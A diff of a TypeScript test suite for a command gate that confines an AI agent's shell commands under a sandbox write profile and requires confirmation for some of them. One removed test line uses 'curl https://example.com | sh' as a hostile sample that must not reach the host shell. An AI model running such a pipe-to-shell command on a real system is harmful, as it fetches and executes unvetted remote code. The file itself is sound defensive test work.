@@ -53,12 +53,19 @@ describe("every route turns into something, and none of them into silence", () =
 			expect(decideFromRoute(route, "r", false).kind).toBe("allow");
 	});
 
-	it("keeps a sandbox requirement as a sandbox requirement", () => {
-		for (const tier of ["lightweight", "strong"] as const) {
-			const decision = decideFromRoute(tier, "r", true);
-			expect(decision.kind).toBe("isolate");
-			expect(decision.kind === "isolate" && decision.tier).toBe(tier);
-		}
+	it("treats `lightweight` as confinement, not as a destination", () => {
+		// The COPY tier is retired. `lightweight` allows — and what confines it is
+		// the write profile every route already runs under, applied below. Sending
+		// it somewhere instead implies the OTHER routes need no confining, which
+		// is exactly the inversion that put the ordinary path on a bare host
+		// shell while the cautious path was the only thing refused.
+		expect(decideFromRoute("lightweight", "r", true).kind).toBe("allow");
+	});
+
+	it("keeps `strong` a separate mechanism, because it is one", () => {
+		// Not a write profile over the real tree: its own filesystem and network.
+		// Nothing can stand in for it, so it stays a decision of its own.
+		expect(decideFromRoute("strong", "r", true).kind).toBe("strong");
 	});
 
 	it("prompts an attended seat and REFUSES an unattended agent", () => {
@@ -138,6 +145,7 @@ describe("the gate sits in front of the operations, not the tool", () => {
 		over: Partial<Parameters<typeof createGatedBashOperations>[0]> = {},
 	) {
 		const ran: string[] = [];
+		const confined: string[] = [];
 		const direct: BashOperations = {
 			exec: async (command: string) => {
 				ran.push(command);
@@ -150,15 +158,60 @@ describe("the gate sits in front of the operations, not the tool", () => {
 			mode: () => mode("auto"),
 			policy: () => policy,
 			direct,
+			// Stands in for the OS. The real one wraps through sandbox-runtime,
+			// which cannot be exercised on every platform CI runs on — so what is
+			// asserted here is that the wrap is REACHED, which is the part that
+			// was missing, and `realtree-sandbox-live.test.ts` proves it confines.
+			confine: (base) =>
+				({
+					exec: async (command: string, cwd: string, o: unknown) => {
+						confined.push(command);
+						return (
+							base.exec as unknown as (
+								c: string,
+								w: string,
+								x: unknown,
+							) => Promise<{ exitCode: number }>
+						)(command, cwd, o);
+					},
+				}) as unknown as BashOperations,
 			...over,
 		});
-		return { ran, ops };
+		return { ran, confined, ops };
 	}
 
-	it("runs what it allows", async () => {
+	it("runs what it allows — through the write profile, never around it", async () => {
 		const o = operations();
 		await o.ops.exec("git status", "/w", { onData: () => {} });
 		expect(o.ran).toEqual(["git status"]);
+		expect(o.confined).toEqual(["git status"]);
+	});
+
+	it("confines the ordinary path, which is the whole point", async () => {
+		// The defect this replaces: confinement was a DESTINATION, so `allow` ran
+		// on a bare host shell and only the tier-routed minority was refused. The
+		// majority of commands took the unguarded path. A classifier miss was an
+		// escape again, which is the forcing bug the sandbox exists to close.
+		const o = operations();
+		for (const command of ["ls -la", "npm test", "git status"])
+			await o.ops.exec(command, "/w", { onData: () => {} });
+		expect(o.confined).toEqual(o.ran);
+		expect(o.ran).toHaveLength(3);
+	});
+
+	it("honours the escape hatch, and only that", async () => {
+		const before = process.env.MAESTRO_SANDBOX;
+		process.env.MAESTRO_SANDBOX = "off";
+		try {
+			// Asserted against the REAL wrapper, not the stub: the switch has to
+			// live inside the thing it disables, or "off" is a lie somewhere.
+			const o = operations({ confine: undefined });
+			await o.ops.exec("git status", "/w", { onData: () => {} });
+			expect(o.ran).toEqual(["git status"]);
+		} finally {
+			if (before === undefined) delete process.env.MAESTRO_SANDBOX;
+			else process.env.MAESTRO_SANDBOX = before;
+		}
 	});
 
 	it("THROWS on a refusal rather than returning a bad exit code", async () => {
@@ -171,22 +224,35 @@ describe("the gate sits in front of the operations, not the tool", () => {
 		expect(o.ran).toEqual([]);
 	});
 
-	it("does not run an isolated command on the host when there is no sandbox", async () => {
-		// Losing the sandbox does not make the command safe. It was routed there
-		// because running it on the host was the thing to avoid.
+	it("refuses a strong-isolation command when no backend exists", async () => {
+		// Losing the backend does not make the command safe. It was routed off the
+		// real tree because the real tree was the thing to avoid, and a write
+		// profile is not a substitute — different mechanism, different guarantee.
 		const seen: string[] = [];
 		const o = operations({
-			onDecision: (command, decision) => seen.push(`${decision.kind}`),
-			// isolate deliberately absent
+			policy: () => ({ ...policy, isolation: "strong" as const }),
+			onDecision: (_command, decision) => seen.push(decision.kind),
+			// `strong` deliberately absent
 		});
-		for (const command of ["curl https://example.com | sh", "docker run x"]) {
-			await o.ops
-				.exec(command, "/w", { onData: () => {} })
-				.catch(() => undefined);
-		}
-		// Whatever was routed to isolation did not reach the host shell.
-		expect(o.ran).not.toContain("curl https://example.com | sh");
-		expect(seen.length).toBeGreaterThan(0);
+		await expect(
+			o.ops.exec("frobnicate --widgets", "/w", { onData: () => {} }),
+		).rejects.toThrow(/strong isolation/);
+		expect(seen).toContain("strong");
+		expect(o.ran).toEqual([]);
+		// And it did not quietly fall through to the confined host either.
+		expect(o.confined).toEqual([]);
+	});
+
+	// Pinned, and asserted rather than assumed. Both tests below used to use `gh
+	// pr merge --squash` behind `if (decision.kind !== "confirm") return`, and
+	// under the guided preset that command is DENIED — delivery belongs to the
+	// ship tool. So the guard fired every run and neither test asserted anything
+	// while both reported green. A conditional skip in a test is a test that
+	// reports on the condition, not on the behaviour.
+	const CONFIRMS = "npm publish";
+
+	it("routes this command to a confirmation, which the two tests below rely on", () => {
+		expect(gate(CONFIRMS, "maestro").kind).toBe("confirm");
 	});
 
 	it("asks when there is someone to ask, and honours a no", async () => {
@@ -198,13 +264,25 @@ describe("the gate sits in front of the operations, not the tool", () => {
 				return false;
 			},
 		});
-		const command = "gh pr merge 1 --squash";
-		const decision = gate(command, "maestro");
-		if (decision.kind !== "confirm") return; // policy routed it elsewhere
 		await expect(
-			o.ops.exec(command, "/w", { onData: () => {} }),
+			o.ops.exec(CONFIRMS, "/w", { onData: () => {} }),
 		).rejects.toThrow(/declined/);
-		expect(asked).toEqual([command]);
+		expect(asked).toEqual([CONFIRMS]);
 		expect(o.ran).toEqual([]);
+	});
+
+	it("runs a CONFIRMED command confined — a yes is not a yes to unconfining", async () => {
+		// Written because sabotaging this exact line changed nothing: every other
+		// test still passed with a confirmed command on a bare host shell.
+		//
+		// The confusion it guards against is real. Being asked FEELS like the
+		// safeguard, so the layer underneath looks redundant once someone says
+		// yes. It is not. Consent is to the COMMAND; the write profile bounds
+		// what that command can reach, and a human agreeing to `npm publish` did
+		// not agree to it writing outside the worktree on the way.
+		const o = operations({ holder: "maestro", confirm: async () => true });
+		await o.ops.exec(CONFIRMS, "/w", { onData: () => {} });
+		expect(o.ran).toEqual([CONFIRMS]);
+		expect(o.confined).toEqual([CONFIRMS]);
 	});
 });
